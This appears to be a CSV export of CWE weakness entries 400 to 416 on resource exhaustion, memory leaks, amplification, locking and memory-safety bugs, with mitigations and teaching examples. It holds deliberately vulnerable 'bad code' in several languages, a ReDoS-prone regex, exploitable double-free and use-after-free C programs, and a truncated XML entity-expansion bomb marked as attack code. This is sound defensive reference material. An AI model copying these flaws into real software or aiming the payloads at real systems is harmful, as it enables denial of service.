CWE-400: Uncontrolled Resource Consumption,"The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other)The most common result of resource exhaustion is denial of service. The product may slow down, crash due to unhandled errors, or lock out legitimate users., Likelihood: ; Scope: Access ControlOther, Impact: Technical Impact:Bypass Protection Mechanism; OtherIn some cases it may be possible to force the product to ""fail open"" in the event of resource exhaustion. The state of the product -- and possibly the security functionality - may then be compromised., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:Javaclass Worker implements Executor {...public void execute(Runnable r) {try {...}catch (InterruptedException ie) {// postpone responseThread.currentThread().interrupt();}}public Worker(Channel ch, int nworkers) {...}protected void activate() {Runnable loop = new Runnable() {public void run() {try {for (;;) {Runnable r = ...;r.run();}}catch (InterruptedException ie) {...}}};new Thread(loop).start();}}There are no limits to runnables. Potentially an attacker could cause resource problems very quickly.Example 2This code allocates a socket and forks each time it receives a new connection.(bad code)Example Language:Csock=socket(AF_INET, SOCK_STREAM, 0);while (1) {newsock=accept(sock, ...);printf(""A connection has been accepted\n"");pid = fork();}The program does not track how many connections have been made, and it does not limit the number of connections. Because forking is a relatively expensive operation, an attacker would be able to cause the system to run out of CPU, processes, or memory by making a large number of connections. Alternatively, an attacker could consume all available connections, preventing others from accessing the system remotely.Example 3In the following example a server socket connection is used to accept a request to store data on the local file system using a specified filename. The method openSocketConnection establishes a server socket to accept requests from a client. When a client establishes a connection to this service the getNextMessage method is first used to retrieve from the socket the name of the file to store the data, the openFileToWrite method will validate the filename and open a file to write to on the local file system. The getNextMessage is then used within a while loop to continuously read data from the socket and output the data to the file until there is no longer any data from the socket.(bad code)Example Language:Cint writeDataFromSocketToFile(char *host, int port){char filename[FILENAME_SIZE];char buffer[BUFFER_SIZE];int socket = openSocketConnection(host, port);if (socket < 0) {printf(""Unable to open socket connection"");return(FAIL);}if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) {if (openFileToWrite(filename) > 0) {while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){if (!(writeToFile(buffer) > 0))break;}}closeFile();}closeSocket(socket);}This example creates a situation where data can be dumped to a file on the local file system without any limits on the size of the file. This could potentially exhaust file or disk resources and/or limit other clients' ability to access the service.Example 4In the following example, the processMessage method receives a two dimensional character array containing the message to be processed. The two-dimensional character array contains the length of the message in the first character array and the message body in the second character array. The getMessageLength method retrieves the integer value of the length from the first character array. After validating that the message length is greater than zero, the body character array pointer points to the start of the second character array of the two-dimensional character array and memory is allocated for the new body character array.(bad code)Example Language:C/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */int processMessage(char **message){char *body;int length = getMessageLength(message[0]);if (length > 0) {body = &message[1][0];processMessageBody(body);return(SUCCESS);}else {printf(""Unable to process message; invalid message length"");return(FAIL);}}This example creates a situation where the length of the body character array can be very large and will consume excessive memory, exhausting system resources. This can be avoided by restricting the length of the second character array with a maximum length checkAlso, consider changing the type from 'int' to 'unsigned int', so that you are always guaranteed that the number is positive. This might not be possible if the protocol specifically requires allowing negative values, or if you cannot control the return value from getMessageLength(), but it could simplify the check to ensure the input is positive, and eliminate other errors such as signed-to-unsigned conversion errors (CWE-195) that may occur elsewhere in the code.(good code)Example Language:Cunsigned int length = getMessageLength(message[0]);if ((length > 0) && (length < MAX_LENGTH)) {...}Example 5In the following example, a server object creates a server socket and accepts client connections to the socket. For every client connection to the socket a separate thread object is generated using the ClientSocketThread class that handles request made by the client through the socket.(bad code)Example Language:Javapublic void acceptConnections() {try {ServerSocket serverSocket = new ServerSocket(SERVER_PORT);int counter = 0;boolean hasConnections = true;while (hasConnections) {Socket client = serverSocket.accept();Thread t = new Thread(new ClientSocketThread(client));t.setName(client.getInetAddress().getHostName() + "":"" + counter++);t.start();}serverSocket.close();} catch (IOException ex) {...}}In this example there is no limit to the number of client connections and client threads that are created. Allowing an unlimited number of client connections and threads could potentially overwhelm the system and system resources.The server should limit the number of client connections and the client threads that are created. This can be easily done by creating a thread pool object that limits the number of threads that are generated.(good code)Example Language:Javapublic static final int SERVER_PORT = 4444;public static final int MAX_CONNECTIONS = 10;...public void acceptConnections() {try {ServerSocket serverSocket = new ServerSocket(SERVER_PORT);int counter = 0;boolean hasConnections = true;while (hasConnections) {hasConnections = checkForMoreConnections();Socket client = serverSocket.accept();Thread t = new Thread(new ClientSocketThread(client));t.setName(client.getInetAddress().getHostName() + "":"" + counter++);ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);pool.execute(t);}serverSocket.close();} catch (IOException ex) {...}}Example 6In the following example, the serve function receives an http request and an http response writer. It reads the entire request body.(bad code)Example Language:Gofunc serve(w http.ResponseWriter, r *http.Request) {var body []byteif r.Body != nil {if data, err := io.ReadAll(r.Body); err == nil {body = data}}}Because ReadAll is defined to read from src until EOF, it does not treat an EOF from Read as an error to be reported. This example creates a situation where the length of the body supplied can be very large and will consume excessive memory, exhausting system resources. This can be avoided by ensuring the body does not exceed a predetermined length of bytes.MaxBytesReader prevents clients from accidentally or maliciously sending a large request and wasting server resources. If possible, the code could be changed to tell ResponseWriter to close the connection after the limit has been reached.(good code)Example Language:Gofunc serve(w http.ResponseWriter, r *http.Request) {var body []byteconst MaxRespBodyLength = 1e6if r.Body != nil {r.Body = http.MaxBytesReader(w, r.Body, MaxRespBodyLength)if data, err := io.ReadAll(r.Body); err == nil {body = data}}}","Phase:  Architecture and DesignDesign throttling mechanisms into the system architecture. The best protection is to limit the amount of resources that an unauthorized user can cause to be expended. A strong authentication and access control model will help prevent such attacks from occurring in the first place. The login application should be protected against DoS attacks as much as possible. Limiting the database access, perhaps by caching result sets, can help minimize the resources expended. To further limit the potential for a DoS attack, consider tracking the rate of requests received from users and blocking requests that exceed a defined rate threshold.Phase:  Architecture and DesignMitigation of resource exhaustion attacks requires that the target system either:recognizes the attack and denies that user further access for a given amount of time, oruniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.The second solution is simply difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply makes the attack require more resources on the part of the attacker.Phase:  Architecture and DesignEnsure that protocols have specific limits of scale placed on them.Phase:  ImplementationEnsure that all failures in resource allocation place the system into a safe posture."
CWE-401: Missing Release of Memory after Effective Lifetime,"The product does not sufficiently track and release allocated memory after it has been used, which slowly consumes remaining memory.","Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or Restart; DoS: Instability; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)Most memory leaks result in general product reliability problems, but if an attacker can intentionally trigger a memory leak, the attacker might be able to launch a denial of service attack (by crashing or hanging the program) or take advantage of other unexpected program behavior resulting from a low memory condition., Likelihood: ; Scope: Other, Impact: Technical Impact:Reduce Performance, Likelihood: ","Example 1The following C function leaks a block of allocated memory if the call to read() does not return the expected number of bytes:(bad code)Example Language:Cchar* getBlock(int fd) {char* buf = (char*) malloc(BLOCK_SIZE);if (!buf) {return NULL;}if (read(fd, buf, BLOCK_SIZE) != BLOCK_SIZE) {return NULL;}return buf;}","Phase:  ImplementationStrategy:  Libraries or FrameworksChoose a language or tool that provides automatic memory management, or makes manual memory management less error-prone.For example, glibc in Linux provides protection against free of invalid pointers.When using Xcode to target OS X or iOS, enable automatic reference counting (ARC) [REF-391].To help correctly and consistently manage memory when programming in C++, consider using a smart pointer class such as std::auto_ptr (defined by ISO/IEC ISO/IEC 14882:2003), std::shared_ptr and std::unique_ptr (specified by an upcoming revision of the C++ standard, informally referred to as C++ 1x), or equivalent solutions such as Boost.Phase:  Architecture and DesignUse an abstraction library to abstract away risky APIs. Not a complete solution.Phases:  Architecture and Design; Build and CompilationThe Boehm-Demers-Weiser Garbage Collector or valgrind can be used to detect leaks in code.Note:This is not a complete solution as it is not 100% effective."
CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak'),The product makes resources available to untrusted parties when those resources are only intended to be accessed by the product.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-403: Exposure of File Descriptor to Unintended Control Sphere ('File Descriptor Leak'),"A process does not close sensitive file descriptors before invoking a child process, which allows the child to perform unauthorized I/O operations using those descriptors.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Application Data; Modify Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-404: Improper Resource Shutdown or Release,The product does not release or incorrectly releases a resource before it is made available for re-use.,"Scope: AvailabilityOther, Impact: Technical Impact:DoS: Resource Consumption (Other); Varies by ContextMost unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker might be able to launch a denial of service attack by depleting the resource pool., Likelihood: ; Scope: Confidentiality, Impact: Technical Impact:Read Application DataWhen a resource containing sensitive information is not correctly shutdown, it may expose the sensitive data in a subsequent allocation., Likelihood: ","Example 1The following method never closes the new file handle. Given enough time, the Finalize() method for BufferReader should eventually call Close(), but there is no guarantee as to how long this action will take. In fact, there is no guarantee that Finalize() will ever be invoked. In a busy environment, the Operating System could use up all of the available file handles before the Close() function is called.(bad code)Example Language:Javaprivate void processFile(string fName){BufferReader fil = new BufferReader(new FileReader(fName));String line;while ((line = fil.ReadLine()) != null){processLine(line);}}The good code example simply adds an explicit call to the Close() function when the system is done using the file. Within a simple example such as this the problem is easy to see and fix. In a real system, the problem may be considerably more obscure.(good code)Example Language:Javaprivate void processFile(string fName){BufferReader fil = new BufferReader(new FileReader(fName));String line;while ((line = fil.ReadLine()) != null){processLine(line);}fil.Close();}Example 2This code attempts to open a connection to a database and catches any exceptions that may occur.(bad code)Example Language:Javatry {Connection con = DriverManager.getConnection(some_connection_string);}catch ( Exception e ) {log( e );}If an exception occurs after establishing the database connection and before the same connection closes, the pool of database connections may become exhausted. If the number of available connections is exceeded, other users cannot access this resource, effectively denying access to the application.Example 3Under normal conditions the following C# code executes a database query, processes the results returned by the database, and closes the allocated SqlConnection object. But if an exception occurs while executing the SQL or processing the results, the SqlConnection object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.(bad code)Example Language:C#...SqlConnection conn = new SqlConnection(connString);SqlCommand cmd = new SqlCommand(queryString);cmd.Connection = conn;conn.Open();SqlDataReader rdr = cmd.ExecuteReader();HarvestResults(rdr);conn.Connection.Close();...Example 4The following C function does not close the file handle it opens if an error occurs. If the process is long-lived, the process can run out of file handles.(bad code)Example Language:Cint decodeFile(char* fName) {char buf[BUF_SZ];FILE* f = fopen(fName, ""r"");if (!f) {printf(""cannot open %s\n"", fName);return DECODE_FAIL;}else {while (fgets(buf, BUF_SZ, f)) {if (!checkChecksum(buf)) {return DECODE_FAIL;}else {decodeBlock(buf);}}}fclose(f);return DECODE_SUCCESS;}Example 5In this example, the program does not use matching functions such as malloc/free, new/delete, and new[]/delete[] to allocate/deallocate the resource.(bad code)Example Language:C++class A {void foo();};void A::foo(){int *ptr;ptr = (int*)malloc(sizeof(int));delete ptr;}Example 6In this example, the program calls the delete[] function on non-heap memory.(bad code)Example Language:C++class A{void foo(bool);};void A::foo(bool heap) {int localArray[2] = {11,22};int *p = localArray;if (heap){p = new int[2];}delete[] p;}","Phase:  RequirementsStrategy:  Language SelectionUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.For example, languages such as Java, Ruby, and Lisp perform automatic garbage collection that releases memory for objects that have been deallocated.Phase:  ImplementationIt is good practice to be responsible for freeing all resources you allocate and to be consistent with how and where you free memory in a function. If you allocate memory that you intend to free upon completion of the function, you must be sure to free the memory at all exit points for that function including error conditions.Phase:  ImplementationMemory should be allocated/freed using matching functions such as malloc/free, new/delete, and new[]/delete[].Phase:  ImplementationWhen releasing a complex object or structure, ensure that you properly dispose of all of its member components, not just the object itself."
CWE-405: Asymmetric Resource Consumption (Amplification),"The product does not properly control situations in which an adversary can cause the product to consume or produce excessive resources without requiring the adversary to invest equivalent work or otherwise prove authorization, i.e., the adversary's influence is ""asymmetric.""","Scope: Availability, Impact: Technical Impact:DoS: Amplification; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other)Sometimes this is a factor in ""flood"" attacks, but other types of amplification exist., Likelihood: High","Example 1This code listens on a port for DNS requests and sends the result to the requesting address.(bad code)Example Language:Pythonsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.bind( (UDP_IP,UDP_PORT) )while true:data = sock.recvfrom(1024)if not data:break(requestIP, nameToResolve) = parseUDPpacket(data)record = resolveName(nameToResolve)sendResponse(requestIP,record)This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.Example 2This function prints the contents of a specified file requested by a user.(bad code)Example Language:PHPfunction printFile($username,$filename){//read file into string$file = file_get_contents($filename);if ($file && isOwnerOf($username,$filename)){echo $file;return true;}else{echo 'You are not authorized to view this file';}return false;}This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway.Example 3The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected.(attack code)Example Language:XML<?xml version=""1.0""?><!DOCTYPE MaliciousDTD [<!ENTITY ZERO ""A""><!ENTITY ONE ""&ZERO;&ZERO;""><!ENTITY TWO ""&ONE;&ONE;"">...<!ENTITY THIRTYTWO ""&THIRTYONE;&THIRTYONE;"">]><data>&THIRTYTWO;</data>Example 4This example attempts to check if an input string is a ""sentence"" [REF-1164].(bad code)Example Language:JavaScriptvar test_string = ""Bad characters: $@#"";var bad_pattern  = /^(\w+\s?)*$/i;var result = test_string.search(bad_pattern);The regular expression has a vulnerable backtracking clause inside (\w+\s?)*$ which can be triggered to cause a Denial of Service by processing particular phrases.To fix the backtracking problem, backtracking is removed with the ?= portion of the expression which changes it to a lookahead and the \2 which prevents the backtracking. The modified example is:(good code)Example Language:JavaScriptvar test_string = ""Bad characters: $@#"";var good_pattern  = /^((?=(\w+))\2\s?)*$/i;var result = test_string.search(good_pattern);Note that [REF-1164] has a more thorough (and lengthy) explanation of everything going on within the RegEx.Example 5An adversary can cause significant resource
	     consumption on a server by filtering the cryptographic
	     algorithms offered by the client to the ones that are the
	     most resource-intensive on the server side. After
	     discovering which cryptographic algorithms are supported
	     by the server, a malicious client can send the initial
	     cryptographic handshake messages that contains only the
	     resource-intensive algorithms. For some cryptographic
	     protocols, these messages can be completely
	     prefabricated, as the resource-intensive part of the
	     handshake happens on the server-side first (such as TLS),
	     rather than on the client side. In the case of
	     cryptographic protocols where the resource-intensive part
	     should happen on the client-side first (such as SSH), a
	     malicious client can send a forged/precalculated
	     computation result, which seems correct to the server, so
	     the resource-intensive part of the handshake is going to
	     happen on the server side. A malicious client is required
	     to send only the initial messages of a cryptographic
	     handshake to initiate the resource-consuming part of the
	     cryptographic handshake. These messages are usually
	     small, and generating them requires minimal computational
	     effort, enabling a denial-of-service attack. An
	     additional risk is the fact that higher key size
	     increases the effectiveness of the attack. Cryptographic
	     protocols where the clients have influence over the size
	     of the used key (such as TLS 1.3 or SSH) are most at
	     risk, as the client can enforce the highest key size
	     supported by the server.","Phase:  Architecture and DesignAn application must make resources available to a client commensurate with the client's access level.Phase:  Architecture and DesignAn application must, at all times, keep track of allocated resources and meter their usage appropriately.Phase:  System ConfigurationConsider disabling resource-intensive algorithms on the server side, such as Diffie-Hellman key exchange.Effectiveness: HighNote:Business requirements may prevent disabling resource-intensive algorithms."
CWE-406: Insufficient Control of Network Message Volume (Network Amplification),"The product does not sufficiently monitor or control transmitted network traffic volume, so that an actor can cause the product to transmit more traffic than should be allowed for that actor.","Scope: Availability, Impact: Technical Impact:DoS: Amplification; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other)System resources can be quickly consumed leading to poor application performance or system crash. This may affect network performance and could be used to attack other systems and applications relying on network performance., Likelihood: ","Example 1This code listens on a port for DNS requests and sends the result to the requesting address.(bad code)Example Language:Pythonsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)sock.bind( (UDP_IP,UDP_PORT) )while true:data = sock.recvfrom(1024)if not data:break(requestIP, nameToResolve) = parseUDPpacket(data)record = resolveName(nameToResolve)sendResponse(requestIP,record)This code sends a DNS record to a requesting IP address. UDP allows the source IP address to be easily changed ('spoofed'), thus allowing an attacker to redirect responses to a target, which may be then be overwhelmed by the network traffic.","Phase:  Architecture and DesignStrategy:  Separation of PrivilegeAn application must make network resources available to a client commensurate with the client's access level.Phase:  PolicyDefine a clear policy for network resource allocation and consumption.Phase:  ImplementationAn application must, at all times, keep track of network resources and meter their usage appropriately."
CWE-407: Inefficient Algorithmic Complexity,"An algorithm in a product has an inefficient worst-case computational complexity that may be detrimental to system performance and can be triggered by an attacker, typically using crafted manipulations that ensure that the worst case is being reached.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other)The typical consequence is CPU consumption, but memory consumption and consumption of other resources can also occur., Likelihood: ","Example 1This example attempts to check if an input string is a ""sentence"" [REF-1164].(bad code)Example Language:JavaScriptvar test_string = ""Bad characters: $@#"";var bad_pattern  = /^(\w+\s?)*$/i;var result = test_string.search(bad_pattern);The regular expression has a vulnerable backtracking clause inside (\w+\s?)*$ which can be triggered to cause a Denial of Service by processing particular phrases.To fix the backtracking problem, backtracking is removed with the ?= portion of the expression which changes it to a lookahead and the \2 which prevents the backtracking. The modified example is:(good code)Example Language:JavaScriptvar test_string = ""Bad characters: $@#"";var good_pattern  = /^((?=(\w+))\2\s?)*$/i;var result = test_string.search(good_pattern);Note that [REF-1164] has a more thorough (and lengthy) explanation of everything going on within the RegEx.",无可能的缓解方案
CWE-408: Incorrect Behavior Order: Early Amplification,The product allows an entity to perform a legitimate but expensive operation before authentication or authorization has taken place.,"Scope: Availability, Impact: Technical Impact:DoS: Amplification; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)System resources, CPU and memory, can be quickly consumed. This can lead to poor system performance or system crash., Likelihood: ","Example 1This function prints the contents of a specified file requested by a user.(bad code)Example Language:PHPfunction printFile($username,$filename){//read file into string$file = file_get_contents($filename);if ($file && isOwnerOf($username,$filename)){echo $file;return true;}else{echo 'You are not authorized to view this file';}return false;}This code first reads a specified file into memory, then prints the file if the user is authorized to see its contents. The read of the file into memory may be resource intensive and is unnecessary if the user is not allowed to see the file anyway.",无可能的缓解方案
CWE-409: Improper Handling of Highly Compressed Data (Data Amplification),The product does not handle or incorrectly handles a compressed input with a very high compression ratio that produces a large output.,"Scope: Availability, Impact: Technical Impact:DoS: Amplification; DoS: Crash, Exit, or Restart; DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory)System resources, CPU and memory, can be quickly consumed. This can lead to poor system performance or system crash., Likelihood: ","Example 1The DTD and the very brief XML below illustrate what is meant by an XML bomb. The ZERO entity contains one character, the letter A. The choice of entity name ZERO is being used to indicate length equivalent to that exponent on two, that is, the length of ZERO is 2^0. Similarly, ONE refers to ZERO twice, therefore the XML parser will expand ONE to a length of 2, or 2^1. Ultimately, we reach entity THIRTYTWO, which will expand to 2^32 characters in length, or 4 GB, probably consuming far more data than expected.(attack code)Example Language:XML<?xml version=""1.0""?><!DOCTYPE MaliciousDTD [<!ENTITY ZERO ""A""><!ENTITY ONE ""&ZERO;&ZERO;""><!ENTITY TWO ""&ONE;&ONE;"">...<!ENTITY THIRTYTWO ""&THIRTYONE;&THIRTYONE;"">]><data>&THIRTYTWO;</data>",无可能的缓解方案
CWE-410: Insufficient Resource Pool,"The product's resource pool is not large enough to handle peak demand, which allows an attacker to prevent others from accessing the resource by using a (relatively) large number of requests for resources.","Scope: AvailabilityIntegrityOther, Impact: Technical Impact:DoS: Crash, Exit, or Restart; OtherFloods often cause a crash or other problem besides denial of the resource itself; these are likely examples of *other* vulnerabilities, not an insufficient resource pool., Likelihood: ","Example 1In the following snippet from a Tomcat configuration file, a JDBC connection pool is defined with a maximum of 5 simultaneous connections (with a 60 second timeout). In this case, it may be trivial for an attacker to instigate a denial of service (DoS) by using up all of the available connections in the pool.(bad code)Example Language:XML<Resource name=""jdbc/exampledb""auth=""Container""type=""javax.sql.DataSource""removeAbandoned=""true""removeAbandonedTimeout=""30""maxActive=""5""maxIdle=""5""maxWait=""60000""username=""testuser""password=""testpass""driverClassName=""com.mysql.jdbc.Driver""url=""jdbc:mysql://localhost/exampledb""/>",Phase:  Architecture and DesignDo not perform resource-intensive transactions for unauthenticated users and/or invalid requests.Phase:  Architecture and DesignConsider implementing a velocity check mechanism which would detect abusive behavior.Phase:  OperationConsider load balancing as an option to handle heavy loads.Phase:  ImplementationMake sure that resource handles are properly closed when no longer needed.Phase:  Architecture and DesignIdentify the system's resource intensive operations and consider protecting them from abuse (e.g. malicious automated script which runs the resources out).
CWE CATEGORY: Resource Locking Problems,Weaknesses in this category are related to improper handling of locks that are used to control access to resources.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-412: Unrestricted Externally Accessible Lock,"The product properly checks for the existence of a lock, but the lock can be externally controlled or influenced by an actor that is outside of the intended sphere of control.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (Other)When an attacker can control a lock, the program may wait indefinitely until the attacker releases the lock, causing a denial of service to other users of the program. This is especially problematic if there is a blocking operation on the lock., Likelihood: ","Example 1This code tries to obtain a lock for a file, then writes to it.(bad code)Example Language:PHPfunction writeToLog($message){$logfile = fopen(""logFile.log"", ""a"");//attempt to get logfile lockif (flock($logfile, LOCK_EX)) {fwrite($logfile,$message);// unlock logfileflock($logfile, LOCK_UN);}else {print ""Could not obtain lock on logFile.log, message not recorded\n"";}}fclose($logFile);PHP by default will wait indefinitely until a file lock is released. If an attacker is able to obtain the file lock, this code will pause execution, possibly leading to denial of service for other users. Note that in this case, if an attacker can perform an flock() on the file, they may already have privileges to destroy the log file. However, this still impacts the execution of other programs that depend on flock().",Phases:  Architecture and Design; ImplementationUse any access control that is offered by the functionality that is offering the lock.Phases:  Architecture and Design; ImplementationUse unpredictable names or identifiers for the locks. This might not always be possible or feasible.Phase:  Architecture and DesignConsider modifying your code to use non-blocking synchronization methods.
CWE-413: Improper Resource Locking,The product does not lock or does not correctly lock a resource when the product must have exclusive access to the resource.,"Scope: IntegrityAvailability, Impact: Technical Impact:Modify Application Data; DoS: Instability; DoS: Crash, Exit, or Restart, Likelihood: ","Example 1The following function attempts to acquire a lock in order to perform operations on a shared resource.(bad code)Example Language:Cvoid f(pthread_mutex_t *mutex) {pthread_mutex_lock(mutex);/* access shared resource */pthread_mutex_unlock(mutex);}However, the code does not check the value returned by pthread_mutex_lock() for errors. If pthread_mutex_lock() cannot acquire the mutex for any reason, the function may introduce a race condition into the program and result in undefined behavior.In order to avoid data races, correctly written programs must check the result of thread synchronization functions and appropriately handle all errors, either by attempting to recover from them or reporting them to higher levels.(good code)Example Language:Cint f(pthread_mutex_t *mutex) {int result;result = pthread_mutex_lock(mutex);if (0 != result)return result;/* access shared resource */return pthread_mutex_unlock(mutex);}Example 2This Java example shows a simple BankAccount class with deposit and withdraw methods.(bad code)Example Language:Javapublic class BankAccount {// variable for bank account balanceprivate double accountBalance;// constructor for BankAccountpublic BankAccount() {accountBalance = 0;}// method to deposit amount into BankAccountpublic void deposit(double depositAmount) {double newBalance = accountBalance + depositAmount;accountBalance = newBalance;}// method to withdraw amount from BankAccountpublic void withdraw(double withdrawAmount) {double newBalance = accountBalance - withdrawAmount;accountBalance = newBalance;}// other methods for accessing the BankAccount object...}However, the deposit and withdraw methods have shared access to the account balance private class variable. This can result in a race condition if multiple threads attempt to call the deposit and withdraw methods simultaneously where the account balance is modified by one thread before another thread has completed modifying the account balance. For example, if a thread attempts to withdraw funds using the withdraw method before another thread that is depositing funds using the deposit method completes the deposit then there may not be sufficient funds for the withdraw transaction.To prevent multiple threads from having simultaneous access to the account balance variable the deposit and withdraw methods should be synchronized using the synchronized modifier.(good code)Example Language:Javapublic class BankAccount {...// synchronized method to deposit amount into BankAccountpublic synchronized void deposit(double depositAmount) {...}// synchronized method to withdraw amount from BankAccountpublic synchronized void withdraw(double withdrawAmount) {...}...}An alternative solution is to use a lock object to ensure exclusive access to the bank account balance variable. As shown below, the deposit and withdraw methods use the lock object to set a lock to block access to the BankAccount object from other threads until the method has completed updating the bank account balance variable.(good code)Example Language:Javapublic class BankAccount {...// lock object for thread access to methodsprivate ReentrantLock balanceChangeLock;// condition object to temporarily release lock to other threadsprivate Condition sufficientFundsCondition;// method to deposit amount into BankAccountpublic void deposit(double amount) {// set lock to block access to BankAccount from other threadsbalanceChangeLock.lock();try {double newBalance = balance + amount;balance = newBalance;// inform other threads that funds are availablesufficientFundsCondition.signalAll();} catch (Exception e) {...}finally {// unlock lock objectbalanceChangeLock.unlock();}}// method to withdraw amount from bank accountpublic void withdraw(double amount) {// set lock to block access to BankAccount from other threadsbalanceChangeLock.lock();try {while (balance < amount) {// temporarily unblock access// until sufficient funds are availablesufficientFundsCondition.await();}double newBalance = balance - amount;balance = newBalance;} catch (Exception e) {...}finally {// unlock lock objectbalanceChangeLock.unlock();}}...}",Phase:  Architecture and DesignUse a non-conflicting privilege scheme.Phases:  Architecture and Design; ImplementationUse synchronization when locking a resource.
CWE-414: Missing Lock Check,A product does not check to see if a lock is present before performing sensitive operations on a resource.,"Scope: IntegrityAvailability, Impact: Technical Impact:Modify Application Data; DoS: Instability; DoS: Crash, Exit, or Restart, Likelihood: ",无示范例子,Phases:  Architecture and Design; ImplementationImplement a reliable lock mechanism.
CWE-415: Double Free,"The product calls free() twice on the same memory address, potentially leading to modification of unexpected memory locations.","Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Modify Memory; Execute Unauthorized Code or CommandsDoubly freeing memory may result in a write-what-where condition, allowing an attacker to execute arbitrary code., Likelihood: ","Example 1The following code shows a simple example of a double free vulnerability.(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);...if (abrt) {free(ptr);}...free(ptr);Double free vulnerabilities have two common (and sometimes overlapping) causes:Error conditions and other exceptional circumstancesConfusion over which part of the program is responsible for freeing the memoryAlthough some double free vulnerabilities are not much more complicated than this example, most are spread out across hundreds of lines of code or even different files. Programmers seem particularly susceptible to freeing global variables more than once.Example 2While contrived, this code should be exploitable on Linux distributions that do not ship with heap-chunk check summing turned on.(bad code)Example Language:C#include <stdio.h>#include <unistd.h>#define BUFSIZE1 512#define BUFSIZE2 ((BUFSIZE1/2) - 8)int main(int argc, char **argv) {char *buf1R1;char *buf2R1;char *buf1R2;buf1R1 = (char *) malloc(BUFSIZE2);buf2R1 = (char *) malloc(BUFSIZE2);free(buf1R1);free(buf2R1);buf1R2 = (char *) malloc(BUFSIZE1);strncpy(buf1R2, argv[1], BUFSIZE1-1);free(buf2R1);free(buf1R2);}","Phase:  Architecture and DesignChoose a language that provides automatic memory management.Phase:  ImplementationEnsure that each allocation is freed only once. After freeing a chunk, set the pointer to NULL to ensure the pointer cannot be freed again. In complicated error conditions, be sure that clean-up routines respect the state of allocation properly. If the language is object oriented, ensure that object destructors delete each chunk of memory only once.Phase:  ImplementationUse a static analysis tool to find double free instances."
CWE-416: Use After Free,"Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.","Scope: Integrity, Impact: Technical Impact:Modify MemoryThe use of previously freed memory may corrupt valid data, if the memory area in question has been allocated and used properly elsewhere., Likelihood: ; Scope: Availability, Impact: Technical Impact:DoS: Crash, Exit, or RestartIf chunk consolidation occurs after the use of previously freed data, the process may crash when invalid data is used as chunk information., Likelihood: ; Scope: IntegrityConfidentialityAvailability, Impact: Technical Impact:Execute Unauthorized Code or CommandsIf malicious data is entered before chunk consolidation can take place, it may be possible to take advantage of a write-what-where primitive to execute arbitrary code., Likelihood: ","Example 1The following example demonstrates the weakness.(bad code)Example Language:C#include <stdio.h>#include <unistd.h>#define BUFSIZER1 512#define BUFSIZER2 ((BUFSIZER1/2) - 8)int main(int argc, char **argv) {char *buf1R1;char *buf2R1;char *buf2R2;char *buf3R2;buf1R1 = (char *) malloc(BUFSIZER1);buf2R1 = (char *) malloc(BUFSIZER1);free(buf2R1);buf2R2 = (char *) malloc(BUFSIZER2);buf3R2 = (char *) malloc(BUFSIZER2);strncpy(buf2R1, argv[1], BUFSIZER1-1);free(buf1R1);free(buf2R2);free(buf3R2);}Example 2The following code illustrates a use after free error:(bad code)Example Language:Cchar* ptr = (char*)malloc (SIZE);if (err) {abrt = 1;free(ptr);}...if (abrt) {logError(""operation aborted before commit"", ptr);}When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function.","Phase:  Architecture and DesignChoose a language that provides automatic memory management.Phase:  ImplementationWhen freeing pointers, be sure to set them to NULL once they are freed. However, the utilization of multiple or complex data structures may lower the usefulness of this strategy."
